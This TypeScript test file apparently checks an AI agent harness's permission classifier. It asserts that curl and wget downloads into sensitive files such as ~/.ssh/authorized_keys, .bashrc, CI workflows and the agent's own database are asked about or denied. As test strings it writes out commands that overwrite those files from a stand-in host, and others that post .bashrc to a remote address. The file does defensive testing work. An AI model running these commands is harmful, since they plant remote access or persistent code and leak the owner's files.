  const rank: Record<string, number> = { allow: 0, "ask-low": 1, "ask-high": 2, owner: 3, deny: 4 };
  const forms = (p: string) => [
    `curl -o ${p} ${url}`, `curl -s -o ${p} ${url}`, `curl -sLo ${p} ${url}`, `curl -o${p} ${url}`, `curl ${url} -o ${p}`, `curl --output ${p} ${url}`, `curl --output=${p} ${url}`,
    `curl -D ${p} ${url}`, `curl --dump-header ${p} ${url}`, `curl -c ${p} ${url}`, `curl --cookie-jar ${p} ${url}`, `curl --trace ${p} ${url}`,
    `wget -O ${p} ${url}`, `wget -qO ${p} ${url}`, `wget -qO${p} ${url}`, `wget -O${p} ${url}`, `wget --output-document=${p} ${url}`, `wget --output-document ${p} ${url}`,
    `wget -o ${p} ${url}`, `wget --output-file=${p} ${url}`, `wget -a ${p} ${url}`, `wget -e output_document=${p} ${url}`, `wget -nv -T 5 -O ${p} ${url}`,
    `xargs curl -o ${p} ${url}`, `env A=1 curl -o ${p} ${url}`, `timeout 5 wget -O ${p} ${url}`,
  ];
  for (const p of ["~/.ssh/authorized_keys", "/home/u/.bashrc", "$HOME/.zshrc", "/home/u/.config/keel-bun/mcp.json", "/home/u/state/keel.db", "/w/repo/.github/workflows/ci.yml", "/w/repo/out.txt", "/tmp/out.txt"]) {
    const want = verdicts(`echo x > ${p}`);
    // (Never looser than the redirect: a send of a download asks more in Auto and with the reviewer, where the redirect is the owner's.)
    for (const line of forms(p)) expect([line, verdicts(line).map((k, i) => rank[k]! >= rank[want[i]!]! || k === want[i])]).toEqual([line, modes.map(() => true)]);
  }
  // A folder the files go into, and the name the address gives them there.
  for (const [line, as] of [
    [`wget -P ~/.ssh https://h.example/authorized_keys`, "echo x > ~/.ssh/authorized_keys"], [`wget --directory-prefix=/home/u/ https://h.example/d/.bashrc`, "echo x > /home/u/.bashrc"],
    [`curl -O --output-dir ~/.ssh https://h.example/authorized_keys`, "echo x > ~/.ssh/authorized_keys"], [`curl --output-dir /home/u -o .zshrc ${url}`, "echo x > /home/u/.zshrc"],
    [`curl -O --output-dir=/home/u https://h.example/p/.bashrc?x=1`, "echo x > /home/u/.bashrc"],
  ] as const) expect([line, verdicts(line).map((k, i) => rank[k]! >= rank[verdicts(as)[i]!]!)]).toEqual([line, modes.map(() => true)]);
  // The server names the file, or a recursive download keeps the pages' paths: the folder is written into, whatever it is named.
  for (const line of [
    `curl -OJ --output-dir /home/u https://h.example/x`,
    `curl -O -J --output-dir ~ https://h.example/x`,
    `curl --remote-name --remote-header-name --output-dir=/home/u https://h.example/x`,
    `curl -OJ --output-dir ~/.ssh https://h.example/x`,
    `wget --content-disposition -P /home/u https://h.example/x`,
    `wget --content-disp -P ~/.ssh https://h.example/x`,
    `wget -r -nd -P /home/u https://h.example/`,
    `wget -rnH -P ~ https://h.example/`,
    `wget -m -nd -P /home/u https://h.example/`,
    `wget --recursive --no-directories --directory-prefix=~/.ssh https://h.example/`,
  ]) expect([line, verdicts(line).map((k) => rank[k]! >= rank["ask-high"]!)]).toEqual([line, modes.map(() => true)]);
  // The files the owner changes are asked as theirs or refused, not run in Full auto: the gap this closed.
  for (const line of ["curl -s -o /home/u/.bashrc https://github.com/o/r/x", "wget -O~/.ssh/authorized_keys https://github.com/o/r/x", "wget -P /home/u https://github.com/o/r/raw/.bashrc"]) expect([line, verdicts(line)[3]]).toEqual([line, "ask-high"]);
  expect(verdicts("curl -o /home/u/state/keel.db https://github.com/o/r/x")[3]).toBe("deny");
  // Reading the page, or sending a file, writes nothing: a page to the output, the bin, or a name in the folder.
  for (const line of ["curl -s https://github.com/o/r/x", "curl -s -o /dev/null https://github.com/o/r/x", "wget -qO- https://github.com/o/r/x", "wget -O - https://github.com/o/r/x", "curl -s -d @/home/u/.bashrc https://github.com/o/r/x", "curl -b /home/u/.bashrc https://github.com/o/r/x", "wget --post-file=/home/u/.bashrc https://github.com/o/r/x", "curl -H -o https://github.com/o/r/x"])
    expect([line, verdicts(line)[3]]).not.toEqual([line, "ask-high"]);
});
